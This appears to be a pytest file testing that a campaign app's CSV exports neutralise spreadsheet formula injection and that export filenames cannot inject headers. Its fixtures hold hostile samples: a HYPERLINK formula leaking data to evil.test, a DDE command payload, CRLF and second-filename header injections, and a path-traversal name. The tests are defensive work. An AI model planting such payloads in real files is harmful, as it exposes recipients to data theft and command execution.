"""
Phase 6.3 — CSV formula injection (OWASP "CSV Injection").

A spreadsheet runs a cell that starts with = + - @, a tab or a carriage return.
Recipient data comes from uploaded CSVs, so a recipient named `=HYPERLINK(…)`
would become a live formula for whoever opens the export. The exports prefix
those cells with a single quote, which spreadsheets show as text, and our own
CSV import drops it again, so an export uploaded back keeps its data.
"""

import csv
import io
import re
from urllib.parse import unquote

import pytest

from server.core.models import URL, Campaign, URLType
from server.utils.csv_export import spreadsheet_safe
from server.utils.domain import get_or_create_default_domain

HOSTILE = {
    "name": '=HYPERLINK("https://evil.test/?leak="&A1,"Click me")',
    "company": "+cmd|' /C calc'!A0",
    "phone": "-2+3",
    "note": "@SUM(1+1)",
    "tabbed": "\t=1+1",
    "carriage": "\r=1+1",
    "plain": "Ana López",
}


def _campaign(db, user, recipient: dict = HOSTILE) -> Campaign:
    campaign = Campaign(
        name="Hostile",
        original_url="https://example.com",
        csv_columns=list(recipient),
        created_by=user.id,
    )
    db.add(campaign)
    db.flush()
    db.add(
        URL(
            short_code="hostile1",
            domain_id=get_or_create_default_domain(db).id,
            original_url="https://example.com",
            url_type=URLType.CAMPAIGN,
            user_data=recipient,
            campaign_id=campaign.id,
            created_by=user.id,
        )
    )
    db.commit()
    return campaign


def _rows(response) -> list[dict]:
    assert response.status_code == 200, response.text
    return list(csv.DictReader(io.StringIO(response.text)))


def _neutralized(value: str) -> str:
    return value if value == HOSTILE["plain"] else "'" + value


class TestExports:
    def test_the_campaign_export(self, client, db_session, test_user, auth_headers):
        campaign = _campaign(db_session, test_user)

        (row,) = _rows(client.get(f"/api/v1/campaigns/{campaign.id}/export", headers=auth_headers))

        assert {key: row[key] for key in HOSTILE} == {
            key: _neutralized(value) for key, value in HOSTILE.items()
        }

    def test_the_campaign_recipients_csv(self, client, db_session, test_user, auth_headers):
        campaign = _campaign(db_session, test_user)

        (row,) = _rows(
            client.get(
                f"/api/v1/analytics/campaigns/{campaign.id}/users?format=csv", headers=auth_headers
            )
        )

        assert {key: row[key] for key in HOSTILE} == {
            key: _neutralized(value) for key, value in HOSTILE.items()
        }
        assert row["clicks"] == "0"  # numbers stay numbers

    @pytest.mark.parametrize(
        "path",
        ["/api/v1/campaigns/{id}/export", "/api/v1/analytics/campaigns/{id}/users?format=csv"],
    )
    def test_a_hostile_column_name_too(self, client, db_session, test_user, auth_headers, path):
        """Column names come from the uploaded CSV's header row."""
        campaign = _campaign(db_session, test_user, {"=cmd|' /C calc'!A0": "x"})

        response = client.get(path.format(id=campaign.id), headers=auth_headers)

        assert "'=cmd|' /C calc'!A0" in next(csv.reader(io.StringIO(response.text)))


class TestRoundTrip:
    def test_an_export_uploaded_back_keeps_its_data(
        self, client, db_session, test_user, auth_headers
    ):
        campaign = _campaign(db_session, test_user)
        exported = client.get(f"/api/v1/campaigns/{campaign.id}/export", headers=auth_headers)

        created = client.post(
            "/api/v1/campaigns",
            json={
                "name": "Again",
                "original_url": "https://example.com",
                "csv_data": exported.text,
            },
            headers=auth_headers,
        )

        assert created.status_code == 201, created.text
        again = db_session.query(Campaign).filter_by(name="Again").one()
        (url,) = db_session.query(URL).filter_by(campaign_id=again.id).all()
        assert {key: url.user_data[key] for key in HOSTILE} == HOSTILE


class TestSpreadsheetSafe:
    @pytest.mark.parametrize("start", ["=", "+", "-", "@", "\t", "\r"])
    def test_text_starting_like_a_formula_is_quoted(self, start):
        assert spreadsheet_safe(f"{start}1+1") == f"'{start}1+1"

    @pytest.mark.parametrize("value", ["Ana", "", "1=1", "a@b.c", "2026-09-28", 5, -5, None])
    def test_anything_else_is_left_alone(self, value):
        assert spreadsheet_safe(value) == value


class TestFilename:
    """The export's filename comes from the campaign's name, which is user input."""

    @pytest.mark.parametrize(
        ("name", "real_name"),
        [
            ("Plain Name", "campaign_Plain Name.csv"),
            ("Q4 🚀", "campaign_Q4 🚀.csv"),
            ("东京", "campaign_东京.csv"),
            ('a"; filename="evil.exe', 'campaign_a"; filename="evil.exe.csv'),
            ("x\r\nSet-Cookie: a=b", "campaign_xSet-Cookie: a=b.csv"),
            ("../../etc/passwd", "campaign_../../etc/passwd.csv"),
        ],
    )
    def test_any_name_exports_with_a_safe_header(
        self, client, db_session, test_user, auth_headers, name, real_name
    ):
        campaign = _campaign(db_session, test_user, {"plain": "x"})
        campaign.name = name
        db_session.commit()

        response = client.get(f"/api/v1/campaigns/{campaign.id}/export", headers=auth_headers)

        assert response.status_code == 200
        header = response.headers["content-disposition"]
        header.encode("latin-1")  # sendable at all
        assert "\r" not in header and "\n" not in header
        fallback = re.search(r'filename="([^"]*)"', header)[1]
        assert re.fullmatch(r"[A-Za-z0-9._ -]+", fallback)
        assert header.count("filename=") == 1  # nothing smuggled in a second one
        encoded = re.search(r"filename\*=UTF-8''(\S+)", header)[1]
        assert unquote(encoded) == real_name
